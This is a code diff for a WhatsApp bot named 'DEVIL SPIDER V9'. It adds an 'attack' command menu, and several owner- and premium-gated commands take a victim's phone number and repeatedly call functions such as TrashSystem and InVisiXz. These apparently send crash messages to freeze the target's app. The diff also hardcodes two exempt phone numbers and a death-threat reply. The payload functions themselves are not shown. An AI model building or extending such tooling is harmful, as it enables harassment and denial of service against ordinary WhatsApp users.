@@ -825,7 +825,7 @@ const reply = async (teks) => {
 let handled = false
 //=================================================//
 if (m.message) {
-    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 Test 💫`))
+    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 DEVIL SPIDER V9 💫`))
     console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Message`))
     console.log(chalk.black.bgHex("#00FF00")(`📅 Date: ${new Date().toLocaleString()} \n💬 Message: ${m.body || m.mtype} \n🗣️ From: ${m.pushName} \n🔢 User JID: ${m.sender}`))
     if (m.isGroup) {
@@ -841,13 +841,35 @@ if (!handled) {
 switch (command) {
 //===========================================//
 case 'menu': case 'spider':{
+let timestamp = speed()
+let latensi = speed() - timestamp
+let run = runtime(process.uptime())
 let kimg=`
-     𝗗𝗘𝗩𝗜𝗟-𝗦𝗣𝗜𝗗𝗘𝗥-𝗩9
-┏━━━━━━━━━━━━━━━━━
-┃  ✰ 𝙷𝚒  ${m.pushName} 𝚃𝚑𝚒𝚜 𝚋𝚘𝚝 𝚒𝚜 𝚜𝚝𝚒𝚕𝚕 𝚞𝚗𝚍𝚎𝚛 𝚖𝚊𝚗𝚝𝚊𝚒𝚗𝚊𝚗𝚌𝚎...
-┃  ✰ 𝚈𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚛𝚒𝚊𝚕?? 𝙹𝚘𝚒𝚗 𝚝𝚑𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕 𝚊𝚗𝚍 𝚏𝚘𝚕𝚕𝚘𝚠 𝚢𝚘𝚞𝚝𝚞𝚋𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕..
-┗━━━━━━━━━━━━━━━━━
-© 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
+     \`𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥-𝗩9\`    
+┏━━━━━━━━━━━━━━━━━━━
+┃ ◉ 𝙷𝚒  ${m.pushName} 
+┃ ◉ 𝙿𝚛𝚎𝚏𝚒𝚡 : ${prefix}
+┃ ◉ 𝚙𝚒𝚗𝚐: ${latensi.toFixed(4)}
+┃ ◉ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${run}
+┗━━━━━━━━━━━━━━━━━━━
+        \`𝗢𝗪𝗡𝗘𝗥 𝗖𝗠𝗗\` 
+┏━━━━━━━━━━━━━━━━━━━
+┃ ◈ addprem
+┃ ◈ addowner
+┃ ◈ delprem
+┃ ◈ delowner
+┗━━━━━━━━━━━━━━━━━━━
+      \`𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗠𝗗\` 
+┏━━━━━━━━━━━━━━━━━━━
+┃ ◈ trash 254###
+┃ ◈ sgc ( group )
+┗━━━━━━━━━━━━━━━━━━━
+        \`𝗢𝗧𝗛𝗘𝗥 𝗖𝗠𝗗\` 
+┏━━━━━━━━━━━━━━━━━━━
+┃ ◈ ping
+┃ ◈ runtime
+┖━━━━━━━━━━━━━━━━━━━
+  © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
 sam.sendMessage(m.chat, { 
 	           text: kimg,
                     contextInfo: {
@@ -1001,6 +1023,16 @@ if (!isCreator) return reply(mess.owner)
 if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await sam.onWhatsApp(target);
+  if (victim == "254742491666") {
+    return;
+    }
+    if (victim == "254104301695") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("You will die,,,,Utakufa vibaya wewe 💀");
+}
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
 await InVisiXz(target, sam, cct = true, ptcp = true)
@@ -1033,6 +1065,16 @@ if (!isCreator) return reply(mess.owner)
 if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await sam.onWhatsApp(target);
+  if (victim == "254742491666") {
+    return;
+    }
+    if (victim == "254104301695") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("You will die,,,,Utakufa vibaya wewe 💀");
+  }
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
    await TrashSystem(target, sam, cct = true, ptcp = true)
@@ -1060,11 +1102,21 @@ mimetype: 'audio/mpeg'
 })
 }
 break
-case 'samsung-kill': {
+case 'all-attack': {
 if (!isCreator) return reply(mess.owner)
 if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await sam.onWhatsApp(target);
+  if (victim == "254742491666") {
+    return;
+    }
+    if (victim == "254104301695") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("You will die,,,,Utakufa vibaya wewe 💀");
+}
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
    await TrashSystem(target, sam, cct = true, ptcp = true)
@@ -1101,6 +1153,16 @@ if (!isCreator) return reply(mess.owner)
 if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+var contactInfo = await sam.onWhatsApp(target);
+  if (victim == "254742491666") {
+    return;
+    }
+    if (victim == "254104301695") {
+    return;
+  }
+  if (contactInfo.length == 0) {
+    return reply("You will die,,,,Utakufa vibaya wewe 💀");
+}
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
    await TrashSystem(target, sam, ptcp = true)
